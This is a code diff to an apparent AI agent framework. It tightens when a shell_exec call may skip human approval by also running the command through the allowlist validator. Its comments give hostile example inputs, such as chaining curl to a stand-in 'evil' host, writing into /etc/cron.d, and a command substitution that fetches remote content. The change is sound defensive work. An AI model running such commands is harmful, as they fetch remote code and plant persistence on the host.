@@ -1618,16 +1618,26 @@ pub async fn execute_tool(
         && exec_policy.is_some_and(|p| p.mode == librefang_types::config::ExecSecurityMode::Full);
 
     // #5962: opt-in — in allowlist mode, a shell_exec whose EVERY base command is a
-    // declared safe_bin may skip the approval prompt. Off by default. The base-command
-    // set is extracted by the same `extract_all_commands` the allowlist gate uses, so a
-    // chained command with any non-safe base (e.g. `env; curl evil`) does NOT bypass.
+    // declared safe_bin may skip the approval prompt. Off by default.
+    //
+    // The skip is a STRICT SUBSET of the execution-time allowlist gate, by design:
+    //   1. every base extracted by `extract_all_commands` ∈ `safe_bins` — keeps the
+    //      intent narrow (operator `allowed_commands` still require approval; only
+    //      stdin-only safe_bins may skip), and rejects chains with a non-safe base
+    //      (`env; curl evil`); and
+    //   2. the command must additionally pass `validate_command_allowlist` itself —
+    //      the same metacharacter + shell-wrapper checks the gate runs at execution.
+    // Clause 2 is load-bearing: without it a single-segment command with a redirect or substitution (`env > /etc/cron.d/x`, `env $(curl evil)`) has one safe base and would skip the prompt only to be blocked later — so the skip must not be looser than the gate it fronts.
+    // Gating on `is_ok()` makes "approval skipped" ⊆ "would actually execute", independent of check ordering.
     let shell_exec_all_safe_bins = tool_name == "shell_exec"
         && exec_policy.is_some_and(|p| {
             p.safe_bins_skip_approval
                 && p.mode == librefang_types::config::ExecSecurityMode::Allowlist
                 && input["command"].as_str().is_some_and(|cmd| {
                     let bases = crate::subprocess_sandbox::extract_all_commands(cmd);
-                    !bases.is_empty() && bases.iter().all(|b| p.safe_bins.iter().any(|sb| sb == b))
+                    !bases.is_empty()
+                        && bases.iter().all(|b| p.safe_bins.iter().any(|sb| sb == b))
+                        && crate::subprocess_sandbox::validate_command_allowlist(cmd, p).is_ok()
                 })
         });
 
